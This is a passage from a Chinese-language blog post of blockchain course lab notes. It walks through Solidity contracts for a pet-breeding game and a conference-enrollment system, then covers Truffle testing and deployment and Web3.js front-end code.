_generateRandomDna(string _str) private view returns (uint)&#123;</span><br><span class="line">        uint rand = uint(keccak256(_str));</span><br><span class="line">        return rand % dnaLength;</span><br><span class="line">    &#125;</span><br><span class="line">    function createRandomAnimal(string _name) public &#123;</span><br><span class="line">        uint randDna = _generateRandomDna(_name);</span><br><span class="line">        _createAnimal(_name, randDna);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>合约实现完成后，我们往后依次添加名为<code>Drogon</code>、<code>Rheagal</code>、<code>Viserion</code>的动物，call他们的ID就会显示他们的信息，比如名字，DNA什么的，如截图所示。</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211116200456986.png" alt="image-20211116200456986"></p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211116200516468.png" alt="image-20211116200516468"></p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211116200534109.png" alt="image-20211116200534109"></p>
<h2 id="实验二-Solidity进阶——宠物成长系统"><a href="#实验二-Solidity进阶——宠物成长系统" class="headerlink" title="实验二 Solidity进阶——宠物成长系统"></a>实验二 Solidity进阶——宠物成长系统</h2><p>在这个实验里，我们在上面的基础上继续扩展合约，新增了每个动物的主人，新建了一个动物ID与主人地址的映射，以及主人动物数量的映射，同时，在<code>createRandomAnimal</code>里限制了必须主人在没有动物的时候才能调用这个函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.12 &lt;0.6.0;</span><br><span class="line"></span><br><span class="line">contract Animallncubators &#123;</span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">    uint dnaLength = 10**16;</span><br><span class="line">    struct Animal &#123;</span><br><span class="line">        uint dna;</span><br><span class="line">        string name;</span><br><span class="line">    &#125;</span><br><span class="line">    Animal[] public animals;</span><br><span class="line">    mapping(address=&gt;uint) ownerAnimalCount;</span><br><span class="line">    mapping(uint=&gt;address) AnimalToOwner;</span><br><span class="line">    event NewAnimal(uint AnimalId, string name, uint dna);</span><br><span class="line">    function _createAnimal(string _name, uint _dna) internal &#123;</span><br><span class="line">        animals.push(Animal(_dna, _name));</span><br><span class="line">        uint _animalId = animals.length - 1;</span><br><span class="line">        AnimalToOwner[_animalId] = msg.sender;</span><br><span class="line">        ownerAnimalCount[msg.sender] += 1;</span><br><span class="line">        NewAnimal(_animalId, _name, _dna);</span><br><span class="line">    &#125;</span><br><span class="line">    function _generateRandomDna(string _str) private view returns (uint)&#123;</span><br><span class="line">        uint rand = uint(keccak256(_str));</span><br><span class="line">        return rand % dnaLength;</span><br><span class="line">    &#125;</span><br><span class="line">    function createRandomAnimal(string _name) public &#123;</span><br><span class="line">        require( ownerAnimalCount[msg.sender] == 0);</span><br><span class="line">        uint randDna = _generateRandomDna(_name);</span><br><span class="line">        _createAnimal(_name, randDna);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>同时又新建了一个继承于<code>Animallncubators</code>的合约<code>AnimalFeeding</code>，文件名是<code>AnimalFeeding.sol</code>，这里面的<code>feedAndGrow</code>函数很神奇，吃了食物之后DNA融合，进化出一个新的动物，名字也改了。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.12 &lt;0.6.0;</span><br><span class="line">import &quot;./Animallncubators.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract AnimalFeeding is Animallncubators&#123;</span><br><span class="line">    function feedAndGrow(uint _AnimalId, uint _targetDna) internal &#123;</span><br><span class="line">        require(keccak256(AnimalToOwner[_AnimalId]) == keccak256(msg.sender));</span><br><span class="line">        Animal storage myAnimal = animals[_AnimalId];</span><br><span class="line">        uint _petDna = _targetDna % dnaLength;</span><br><span class="line">        uint _newDna = uint((myAnimal.dna + _petDna) / 2);</span><br><span class="line">        _newDna = (_newDna / 100) * 100 + 99;</span><br><span class="line">        _createAnimal(&quot;No-one&quot;, _newDna);</span><br><span class="line">    &#125;</span><br><span class="line">    function _catchFood(uint _name) internal pure returns (uint) &#123;</span><br><span class="line">        uint rand = uint(keccak256(_name));</span><br><span class="line">        return rand;</span><br><span class="line">    &#125;</span><br><span class="line">    function feedOnFood(uint _AnimalId, uint _FoodId) public&#123;</span><br><span class="line">        uint _FoodDna = _catchFood(_FoodId);</span><br><span class="line">        feedAndGrow(_AnimalId, _FoodDna);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211123141157370.png" alt="image-20211123141157370"></p>
<p>执行第二只宠物的时候废了，因为一个地址只能有一只精灵。</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211123141245108.png" alt="image-20211123141245108"></p>
<p>我们选取三个地址分别生成三只精灵，然后换回第一个地址，准备投喂。</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211123141905953.png" alt="image-20211123141905953"></p>
<p>投喂成功，新诞生了一只<code>No-one</code>。</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211116212721326.png" alt="image-20211116212721326"></p>
<h2 id="实验三-Solidity高阶理论"><a href="#实验三-Solidity高阶理论" class="headerlink" title="实验三 Solidity高阶理论"></a>实验三 Solidity高阶理论</h2><p>新建<code>ownable.sol</code>，这段代码的意义主要有三：</p>
<ul>
<li><p>创建合约，先写构造函数，将<code>msg.sender</code>（其部署者）设置为<code>owner</code>。</p>
</li>
<li><p>为它加上一个修饰符 <code>onlyOwner</code>，只有合约的所有者owner才能进行访问。</p>
</li>
<li><p>允许将合约所有权转让给他人。</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @title Ownable</span><br><span class="line"> * @dev The Ownable contract has an owner address, and provides basic authorization control</span><br><span class="line"> * functions, this simplifies the implementation of &quot;user permissions&quot;.</span><br><span class="line"> */</span><br><span class="line">contract Ownable &#123;</span><br><span class="line">  address public owner;</span><br><span class="line">  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">   * @dev The Ownable constructor sets the original `owner` of the contract to the sender</span><br><span class="line">   * account.</span><br><span class="line">   */</span><br><span class="line">  function Ownable() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">   * @dev Throws if called by any account other than the owner.</span><br><span class="line">   */</span><br><span class="line">  modifier onlyOwner() &#123;</span><br><span class="line">    require(msg.sender == owner);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">   * @dev Allows the current owner to transfer control of the contract to a newOwner.</span><br><span class="line">   * @param newOwner The address to transfer ownership to.</span><br><span class="line">   */</span><br><span class="line">  function transferOwnership(address newOwner) public onlyOwner &#123;</span><br><span class="line">    require(newOwner != address(0));</span><br><span class="line">    OwnershipTransferred(owner, newOwner);</span><br><span class="line">    owner = newOwner;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在此基础上，我们新增<code>Animallncubators</code>的一些功能，增加了投喂食物的冷却功能，两次食物间隔必须超过一分钟。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.12 &lt;0.6.0;</span><br><span class="line">import &quot;./ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Animallncubators is Ownable&#123;</span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">    uint dnaLength = 10**16;</span><br><span class="line">    uint32 cooldownTime = 60;</span><br><span class="line">    struct Animal &#123;</span><br><span class="line">        uint32 level;</span><br><span class="line">        uint32 readyTime;</span><br><span class="line">        uint dna;</span><br><span class="line">        string name;</span><br><span class="line">    &#125;</span><br><span class="line">    Animal[] public animals;</span><br><span class="line">    mapping(address=&gt;uint) ownerAnimalCount;</span><br><span class="line">    mapping(uint=&gt;address) AnimalToOwner;</span><br><span class="line">    event NewAnimal(uint AnimalId, string name, uint dna);</span><br><span class="line">    function _createAnimal(string _name, uint _dna) internal &#123;</span><br><span class="line">        animals.push(Animal(0, uint32(now), _dna, _name));</span><br><span class="line">        uint _animalId = animals.length - 1;</span><br><span class="line">        AnimalToOwner[_animalId] = msg.sender;</span><br><span class="line">        ownerAnimalCount[msg.sender] += 1;</span><br><span class="line">        NewAnimal(_animalId, _name, _dna);</span><br><span class="line">    &#125;</span><br><span class="line">    function _generateRandomDna(string _str) private view returns (uint)&#123;</span><br><span class="line">        uint rand = uint(keccak256(_str));</span><br><span class="line">        return rand % dnaLength;</span><br><span class="line">    &#125;</span><br><span class="line">    function createRandomAnimal(string _name) public &#123;</span><br><span class="line">        require( ownerAnimalCount[msg.sender] == 0);</span><br><span class="line">        uint randDna = _generateRandomDna(_name);</span><br><span class="line">        _createAnimal(_name, randDna);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这里增加一分钟的限制。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.12 &lt;0.6.0;</span><br><span class="line">import &quot;./Animallncubators.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract AnimalFeeding is Animallncubators&#123;</span><br><span class="line">    function feedAndGrow(uint _AnimalId, uint _targetDna) internal &#123;</span><br><span class="line">        require(keccak256(AnimalToOwner[_AnimalId]) == keccak256(msg.sender));</span><br><span class="line">        Animal storage myAnimal = animals[_AnimalId];</span><br><span class="line">        require(now &gt;= myAnimal.readyTime);</span><br><span class="line">        uint _petDna = _targetDna % dnaLength;</span><br><span class="line">        uint _newDna = uint((myAnimal.dna + _petDna) / 2);</span><br><span class="line">        _newDna = (_newDna / 100) * 100 + 99;</span><br><span class="line">        _createAnimal(&quot;No-one&quot;, _newDna);</span><br><span class="line">        myAnimal.readyTime = uint32(now) + cooldownTime;</span><br><span class="line">    &#125;</span><br><span class="line">    function _catchFood(uint _name) internal pure returns (uint) &#123;</span><br><span class="line">        uint rand = uint(keccak256(_name));</span><br><span class="line">        return rand;</span><br><span class="line">    &#125;</span><br><span class="line">    function feedOnFood(uint _AnimalId, uint _FoodId) public&#123;</span><br><span class="line">        uint _FoodDna = _catchFood(_FoodId);</span><br><span class="line">        feedAndGrow(_AnimalId, _FoodDna);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后我们再写一个合约叫做<code>AnimalHelper</code>，实现一些辅助升级功能。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.12 &lt;0.6.0;</span><br><span class="line">import &quot;./AnimalFeeding.sol&quot;;</span><br><span class="line">contract AnimalHelper is AnimalFeeding&#123;</span><br><span class="line">    modifier aboveLevel (uint _level, uint _AnimalId) &#123;</span><br><span class="line">        require(animals[_AnimalId].level &gt;= _level);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    function changeName(uint _AnimalId, string _newName) external aboveLevel(2, _AnimalId)&#123;</span><br><span class="line">        require(keccak256(msg.sender) == keccak256(AnimalToOwner[_AnimalId]));</span><br><span class="line">        animals[_AnimalId].name = _newName;</span><br><span class="line">    &#125;</span><br><span class="line">    function changeDna(uint _AnimalId, uint _newDna) external aboveLevel(20, _AnimalId)&#123;</span><br><span class="line">        require(keccak256(msg.sender) == keccak256(AnimalToOwner[_AnimalId]));</span><br><span class="line">        animals[_AnimalId].dna = _newDna;</span><br><span class="line">    &#125;</span><br><span class="line">    function getAnimalsByOwner(address _owner)external view returns(uint[])&#123;</span><br><span class="line">        uint[] memory result = new uint[](ownerAnimalCount[_owner]);</span><br><span class="line">        uint8 count = 0;</span><br><span class="line">        for (uint i = 0; i &lt; animals.length; i++) &#123;</span><br><span class="line">            if (keccak256(AnimalToOwner[i]) == keccak256(_owner)) &#123;</span><br><span class="line">                result[count] = i;</span><br><span class="line">                count += 1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>新建一个小动物，然后投喂。</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211123143304320.png" alt="image-20211123143304320"></p>
<p>抓紧时间连续投喂两波</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211123144244104.png" alt="image-20211123144244104"></p>
<p>发现第二波执行失败了。</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211123144251746.png" alt="image-20211123144251746"></p>
<p>最后看一下<code>getAnimalsByOwner</code>这个函数。</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211123144428245.png" alt="image-20211123144428245"></p>
<h2 id="实验四-拓展实验4：solidity高阶篇"><a href="#实验四-拓展实验4：solidity高阶篇" class="headerlink" title="实验四  拓展实验4：solidity高阶篇"></a>实验四  拓展实验4：solidity高阶篇</h2><p>更新一版的<code>Animallncubators</code>，新增了攻击力，赢的次数，输的次数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.12 &lt;0.6.0;</span><br><span class="line">import &quot;./ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Animallncubators is Ownable&#123;</span><br><span class="line">    uint dnaDigits = 16;</span><br><span class="line">    uint dnaLength = 10**16;</span><br><span class="line">    uint32 cooldownTime = 60;</span><br><span class="line">    struct Animal &#123;</span><br><span class="line">        uint32 level;</span><br><span class="line">        uint32 readyTime;</span><br><span class="line">        uint dna;</span><br><span class="line">        uint ATK;</span><br><span class="line">        uint winCount;</span><br><span class="line">        uint lossCount;</span><br><span class="line">        string name;</span><br><span class="line">    &#125;</span><br><span class="line">    Animal[] public animals;</span><br><span class="line">    mapping(address=&gt;uint) ownerAnimalCount;</span><br><span class="line">    mapping(uint=&gt;address) AnimalToOwner;</span><br><span class="line">    event NewAnimal(uint AnimalId, string name, uint dna);</span><br><span class="line">    function _createAnimal(string _name, uint _dna) internal &#123;</span><br><span class="line">        animals.push(Animal(0, uint32(now), _dna, 1, 0, 0, _name));</span><br><span class="line">        uint _animalId = animals.length - 1;</span><br><span class="line">        AnimalToOwner[_animalId] = msg.sender;</span><br><span class="line">        ownerAnimalCount[msg.sender] += 1;</span><br><span class="line">        NewAnimal(_animalId, _name, _dna);</span><br><span class="line">    &#125;</span><br><span class="line">    function _generateRandomDna(string _str) private view returns (uint)&#123;</span><br><span class="line">        uint rand = uint(keccak256(_str));</span><br><span class="line">        return rand % dnaLength;</span><br><span class="line">    &#125;</span><br><span class="line">    function createRandomAnimal(string _name) public &#123;</span><br><span class="line">        require( ownerAnimalCount[msg.sender] == 0);</span><br><span class="line">        uint randDna = _generateRandomDna(_name);</span><br><span class="line">        _createAnimal(_name, randDna);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>模拟对战环节。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.12 &lt;0.6.0;</span><br><span class="line">import &quot;./AnimalHelper.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract AnimalAttack is AnimalHelper&#123;</span><br><span class="line">    uint randNonce = 0;</span><br><span class="line">    function winPro() returns(bool)&#123;</span><br><span class="line">        uint random = uint(keccak256(now, msg.sender, randNonce)) % 100;</span><br><span class="line">        randNonce++;</span><br><span class="line">        return (random &lt; 75);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function fight(uint _attackAnimalId, uint _defenceAnimalId) external &#123;</span><br><span class="line">        if (winPro()) &#123;</span><br><span class="line">            animals[_attackAnimalId].ATK ++;</span><br><span class="line">            animals[_attackAnimalId].winCount ++;</span><br><span class="line">            animals[_defenceAnimalId].lossCount ++;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            animals[_attackAnimalId].lossCount ++;</span><br><span class="line">            animals[_defenceAnimalId].winCount ++;</span><br><span class="line">        &#125;</span><br><span class="line">        animals[_attackAnimalId].readyTime = uint32(now);</span><br><span class="line">        animals[_defenceAnimalId].readyTime = uint32(now);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Week6"><a href="#Week6" class="headerlink" title="Week6"></a>Week6</h1><h2 id="实验-1-会议报名登记系统的基本功能与实现"><a href="#实验-1-会议报名登记系统的基本功能与实现" class="headerlink" title="实验 1 会议报名登记系统的基本功能与实现"></a>实验 1 会议报名登记系统的基本功能与实现</h2><p>实现一个会议报名的智能合约，已经给的差不多了，只需要实现delegate和enrollfor函数即可。</p>
<p>其中，<code>trustees</code>是受托人到其委托人的一个映射，是一个不定长数组，每次被委托的人都往后push即可。</p>
<p><code>enrollFor</code>替人报名，报名逻辑与正常enroll一样，唯一不同的是我们需要在trustees数组中找到委托人，然后以后都报名他。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function delegate(address addr) public&#123;</span><br><span class="line">	trustees[addr].push(participants[msg.sender]);</span><br><span class="line">&#125;</span><br><span class="line">function enrollFor(string memory username,string memory title) public returns(string memory)&#123;</span><br><span class="line">	uint index = 0;</span><br><span class="line">	for (uint i = 0; i &lt; trustees[msg.sender].length; i++) &#123;</span><br><span class="line">		if (keccak256(bytes(trustees[msg.sender][i].name)) == keccak256(bytes(username))) &#123;</span><br><span class="line">			index = i;</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	for (uint i = 0; i &lt; conferences.length; i++)&#123;</span><br><span class="line">		if (keccak256(bytes(conferences[i].title)) == keccak256(bytes(title)))&#123;</span><br><span class="line">			require(conferences[i].current&lt;conferences[i].max,&quot;Enrolled full&quot;);</span><br><span class="line">			conferences[i].current = conferences[i].current+1;</span><br><span class="line">			if(conferences[i].current==conferences[i].max)&#123;</span><br><span class="line">				emit ConferenceExpire(title);</span><br><span class="line">			&#125;</span><br><span class="line">			trustees[msg.sender][index].confs.push(title);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	uint len = trustees[msg.sender][index].confs.length;</span><br><span class="line">	require(len&gt;0,&quot;Conference does not exist&quot;);</span><br><span class="line">	return trustees[msg.sender][index].confs[len-1];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><h4 id="应在合约的哪个函数指定管理员身份？如何指定？"><a href="#应在合约的哪个函数指定管理员身份？如何指定？" class="headerlink" title="应在合约的哪个函数指定管理员身份？如何指定？"></a>应在合约的哪个函数指定管理员身份？如何指定？</h4><p>需要在合约的构造函数处制定，根据实际情景，应该是创建这个会议体制的人为管理员，所以指定admin为msg.sender。</p>
<h4 id="在发起新会议时，如何确定发起者是否为管理员？简述-require-、assert-、-revert-的区别。"><a href="#在发起新会议时，如何确定发起者是否为管理员？简述-require-、assert-、-revert-的区别。" class="headerlink" title="在发起新会议时，如何确定发起者是否为管理员？简述 require()、assert()、 revert()的区别。"></a>在发起新会议时，如何确定发起者是否为管理员？简述 require()、assert()、 revert()的区别。</h4><p><code>require(msg.sender==admin,&quot;permission denied&quot;);</code></p>
<p>require和assert都是条件声明，这三种方式的执行逻辑是相同的：</p>
<p><code>require(msg.sender==admin,&quot;permission denied&quot;)</code>,<code>assert(msg.sender==admin,&quot;permission denied&quot;)</code>,<code>if(msg.sender!=admin) &#123;revert(&quot;permission denied&quot;);&#125;</code>。</p>
<p>区别在于revert和require在执行失败后会返还gas，但是assert就算执行失败了也会照样扣除gas。</p>
<h4 id="简述合约中用-memory-和-storage-声明变量的区别"><a href="#简述合约中用-memory-和-storage-声明变量的区别" class="headerlink" title="简述合约中用 memory 和 storage 声明变量的区别"></a>简述合约中用 memory 和 storage 声明变量的区别</h4><p>Storage 变量是指永久存储在区块链中的变量。 Memory 变量则是临时的，当外部函数对某合约调用完成时，内存型变量即被移除。 你可以把它想象成存储在你电脑的硬盘或是RAM中数据的关系。</p>
<p>一般情况下不用管这俩关键字， 默认情况下Solidity 会自动处理它们。 状态变量（在函数之外声明的变量）默认为“存储”形式，并永久写入区块链；而在函数内部声明的变量是“内存”型的，它们函数调用结束后消失。</p>
<p>然而也有一些情况下，你需要手动声明存储类型，主要用于处理函数内的 结构体和 数组 时。这两个属性主要用于优化代码以节省合约的gas消耗，目前只需知道有时需要显式地声明 storage 或 memory 即可。</p>
<h2 id="实验二-学习用-Truffle-组件部署和测试合约"><a href="#实验二-学习用-Truffle-组件部署和测试合约" class="headerlink" title="实验二  学习用 Truffle 组件部署和测试合约"></a>实验二  学习用 Truffle 组件部署和测试合约</h2><p>用npm安装truffle。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install truffle -g</span><br></pre></td></tr></table></figure>
<p>之后写测试合约来鉴定功能是否正常。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.25 &lt;0.7.0;</span><br><span class="line"></span><br><span class="line">import &quot;truffle/Assert.sol&quot;;</span><br><span class="line">import &quot;truffle/DeployedAddresses.sol&quot;;</span><br><span class="line">import &quot;../contracts/Enrollment.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract TestEnrollment&#123;</span><br><span class="line">    //测试注册后，是否返回正确注册信息（仅测试name即可）</span><br><span class="line">    function testSignUp() public &#123;</span><br><span class="line">        Enrollment en = new Enrollment();</span><br><span class="line">        (string memory name, ) = en.signUp(&quot;alice&quot;,&quot;male&quot;);</span><br><span class="line">        (string memory expected_name, ) = (&quot;alice&quot;,&quot;male&quot;);</span><br><span class="line">        Assert.equal(name,expected_name,&quot;signup failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //测试管理员添加新会议是否成功</span><br><span class="line">    function testNewConf() public&#123;</span><br><span class="line">        Enrollment enroll = new Enrollment();</span><br><span class="line">        string memory expected = &quot;conf1&quot;;</span><br><span class="line">        Assert.equal(enroll.newConference(&quot;conf1&quot;,&quot;beijing&quot;,30),expected,&quot;new conference failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //请测试enroll函数，确保当用户报名后，其已报名会议列表中有该会议。提示：不要忘记先由管理员创建会议。</span><br><span class="line">     function testEnroll() public&#123;</span><br><span class="line">         Enrollment en = new Enrollment();</span><br><span class="line">         string memory expected = &quot;conf1&quot;;</span><br><span class="line">         en.newConference(&quot;conf1&quot;,&quot;beijing&quot;,30);</span><br><span class="line">         Assert.equal(en.enroll(&quot;conf1&quot;), expected,&quot;Enrolled full&quot;);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码写完后，进行测试。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">truffle test</span><br></pre></td></tr></table></figure>
<p>可以看到测试成功。</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211123200646354.png" alt="image-20211123200646354"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">truffle migrate</span><br></pre></td></tr></table></figure>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211123200809853.png" alt="image-20211123200809853"></p>
<p>合约部署成功。</p>
<p>部署之前会先进行链的初始化，会在本地保存在一个json文件中。之后需要进行合约 的编写，进行详细的合约规定。第三步需要对合约进行编译，将之前的json文件中的 ABI和EVM code进行获取编译。第四步实现合约的部署，将已经实现好的合约部署 到网络，如下截图：</p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211130200446359.png" alt="image-20211130200446359"></p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211130201037162.png" alt="image-20211130201037162"></p>
<p><img src="/2021/10/19/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%9E%E9%AA%8C/assets/image-20211130201133207.png" alt="image-20211130201133207"></p>
<h2 id="实验三-利用-Web3-js-实现合约与前端的结合"><a href="#实验三-利用-Web3-js-实现合约与前端的结合" class="headerlink" title="实验三  利用 Web3.js 实现合约与前端的结合"></a>实验三  利用 Web3.js 实现合约与前端的结合</h2><p>我们需要在：<code>src/contracts/contract.js</code>补充合约信息,以及<code>src/component/xx</code>组件<code>/index.js</code> 补充web3交互代码，其中<code>conflist</code>和<code>signup</code>中有简单的样例。</p>
<p>delegate部分：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> mapDispatchToProps = <span class="function">(<span class="params">dispatch</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="function"><span class="title">submit</span>(<span class="params">address</span>)</span> &#123;</span><br><span class="line">      contract.methods.delegate(address) <span class="comment">//调用合约signUp方法</span></span><br><span class="line">      .send(&#123;<span class="attr">from</span>:<span class="built_in">window</span>.web3.eth.accounts[<span class="number">0</span>]&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">err,res</span>)</span>&#123;<span class="built_in">console</span>.log(res)&#125;)  <span class="comment">//function中的res为方法返回值</span></span><br><span class="line">      .then(<span class="function">(<span class="params">res</span>)=&gt;</span><span class="built_in">console</span>.log(res)); <span class="comment">//该res为交易执行完后的具体交易信息，如TxHash等</span></span><br><span class="line"></span><br><span class="line">      dispatch(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&#x27;submit_delegate&#x27;</span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure>
<p>signup部分：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> mapDispatchToProps = <span class="function">(<span class="params">dispatch</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="function"><span class="title">submit</span>(<span class="params">username,extra</span>)</span> &#123;</span><br><span class="line">      contract.methods.signUp(username, extra) <span class="comment">//调用合约signUp方法</span></span><br><span class="line">      .send(&#123;<span class="attr">from</span>:<span class="built_in">window</span>.web3.eth.accounts[<span class="number">0</span>]&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">err,res</span>)</span>&#123;<span class="built_in">console</span>.log(res)&#125;)  <span class="comment">//function中的res为方法返回值</span></span><br><span class="line">      .then(<span class="function">(<span class="params">res</span>)=&gt;</span><span class="built_in">console</span>.log(res)); <span class="comment">//该res为交易执行完后的具体交易信息，如TxHash等</span></span><br><span class="line"></span><br><span class="line">      dispatch(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&#x27;submit_signup&#x27;</span></span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>对conflist部分做如下修改，特判了res为空的情况。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">componentDidMount</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">//先执行一遍查询操作</span></span><br><span class="line">  contract.methods.queryConfList()</span><br><span class="line">  .call(&#123;<span class="attr">from</span>:<span class="built_in">window</span>.web3.eth.accounts[<span class="number">0</span>]&#125;,<span class="function">(<span class="params">err,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">//将返回的数组依次压入data中</span></span><br><span class="line">    <span class="built_in">this</span>.setState(&#123;<span class="attr">loading</span>: <span class="literal">true</span>&#125;);</span><br><span class="line">    <span class="keyword">if</span>(res != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;res.length;i=i+<span class="number">2</span>)&#123;</span><br><span class="line">            data.push(&#123;<span class="attr">title</span>:res[i],<span class="attr">detail</span>:res[i+<span class="number">1</span>]&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        data.push(&#123;<span class="attr">title</span>:<span class="string">&#x27;no&#x27;</span>,<span class="attr">detail</span>:<span class="string">&#x27;no&#x27;</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  .then(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">//更新状态，使页面数据重新渲染</span></span><br><span class="line">    <span class="built_in">this</span>.setState(&#123;<span class="attr">loading</span>: <span class="literal">false</span>&#125;);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
<p>同理，myconf也是：</p>
